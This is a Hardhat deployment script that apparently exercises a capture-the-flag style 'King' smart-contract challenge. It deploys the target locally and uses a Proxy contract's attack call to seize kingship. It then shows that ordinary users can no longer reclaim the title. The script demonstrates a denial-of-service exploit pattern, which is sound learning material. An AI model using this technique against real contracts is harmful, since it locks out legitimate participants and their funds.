const hre = require("hardhat");

async function main() {

    const [first, second, third] = (await hre.ethers.getSigners());
    const King = await hre.ethers.getContractFactory("King");
    const king = await King.deploy();

    let currentKing = await king._king();

    console.log("king is : ", currentKing);


    const Proxy = await hre.ethers.getContractFactory("Proxy", { signer: second });
    const proxy = await Proxy.deploy(king.address, { value: hre.ethers.utils.parseEther("1.0") });





    await proxy.attack(hre.ethers.utils.parseEther("0.5"));


    currentKing = await king._king();
    console.log("king is : ", currentKing);


    try {
        await first.sendTransaction({
            to: king.address,
            value: 1000000000
        })
    } catch (err) {
        console.log("cant claim ownership of king contract bc king is now a contract rather than a user ");
    }

    currentKing = await king._king();
    console.log("king is : ", currentKing);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
